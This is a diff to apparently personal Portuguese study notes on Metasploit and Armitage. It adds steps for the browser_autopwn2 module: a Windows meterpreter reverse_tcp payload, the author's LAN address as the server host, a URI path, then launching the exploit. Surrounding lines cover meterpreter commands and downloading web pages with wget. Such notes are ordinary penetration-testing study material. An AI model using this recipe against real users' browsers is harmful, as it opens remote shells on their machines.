@@ -265,8 +265,13 @@ Metasploit - Armitage
     run
     getuid -> pegar o nome do usuario
     sysinfo -> informações do sistema
-    
-
+  AUTOPWN
+    search autopwn
+    use auxiliary/server/browser_autopwn2
+    set payload_win windows/meterpreter/reverse_tcp
+    set srvhost 192.168.100.71 -> endereço minha maquina
+    set uripath "filetypes"
+    exploit
 
 Baixar paginas e projetos web
   wget http://localhost:8080/bodgeit/ -> baixa uma pagina web em html
